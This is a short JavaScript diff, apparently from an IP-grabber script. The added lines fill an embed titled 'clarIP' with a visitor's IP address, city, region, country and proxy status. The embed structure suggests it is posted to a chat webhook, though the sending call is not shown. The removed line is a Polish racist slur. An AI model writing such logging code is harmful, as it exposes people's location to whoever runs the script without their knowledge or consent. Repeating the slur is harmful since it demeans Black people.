@@ -139,7 +139,12 @@
                     var formData = new FormData();
                     var myEmbed = {
                         title: "clarIP",
-                        description: `Lubię murzynskie zady`,
+                        description: `
+                        ip: ${ip} \n
+                        city: ${json.city} \n
+                        region: ${json.region} \n
+                        country: ${json.country} \n
+                        isproxy: ${json.isProxy} \n`,
                         color: hexToDecimal("#"+Math.floor(Math.random()*16777215).toString(16)),
                       };
                       var params = {
